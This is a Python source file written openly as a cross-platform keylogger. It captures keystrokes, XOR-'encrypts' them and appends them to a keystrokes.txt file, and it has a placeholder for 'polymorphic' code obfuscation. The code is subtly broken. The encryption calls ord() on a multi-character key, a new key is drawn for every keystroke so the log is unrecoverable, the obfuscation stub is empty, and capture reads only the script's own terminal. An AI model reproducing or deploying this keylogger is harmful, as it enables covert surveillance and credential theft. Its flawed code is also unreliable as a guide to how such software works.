import random
import platform
import os

# Generate a random key for encryption
def generate_key():
    key = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(10))
    return key

# Encrypt the captured keystrokes using the generated key
def encrypt(keystrokes, key):
    encrypted_keystrokes = ""
    for char in keystrokes:
        encrypted_keystrokes += chr(ord(char) ^ ord(key))
    return encrypted_keystrokes

# Obfuscate the keylogger code
def obfuscate_code():
    # Code obfuscation techniques can be applied here
    # This can include renaming variables and functions, adding junk code, using encoding/decoding techniques, etc.
    pass

# Capture keystrokes based on the platform
def capture_keystroke():
    system = platform.system()
    if system == "Windows":
        import msvcrt
        return msvcrt.getch().decode()
    elif system == "Linux" or system == "Darwin":
        import termios
        import sys
        import tty
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            ch = sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        return ch
    else:
        raise Exception("Unsupported platform")

# Store keystrokes based on the platform
def store_keystrokes(keystrokes):
    system = platform.system()
    if system == "Windows":
        file_path = "keystrokes.txt"
        with open(file_path, "a") as file:
            file.write(keystrokes)
            file.write("\n")
    elif system == "Linux" or system == "Darwin":
        file_path = os.path.expanduser("~/keystrokes.txt")
        with open(file_path, "a") as file:
            file.write(keystrokes)
            file.write("\n")
    else:
        raise Exception("Unsupported platform")

# Main keylogger functionality
def keylogger():
    keystrokes = ""
    key = generate_key()

    while True:
        try:
            # Capture keystrokes
            keystroke = capture_keystroke()

            # Perform polymorphic operations
            obfuscate_code()
            key = generate_key()

            # Encrypt and store keystrokes
            encrypted_keystrokes = encrypt(keystroke, key)
            store_keystrokes(encrypted_keystrokes)

        except Exception as e:
            # Handle any exceptions gracefully
            print(f"Error: {str(e)}")
            continue

# Entry point
if __name__ == "__main__":
    keylogger()
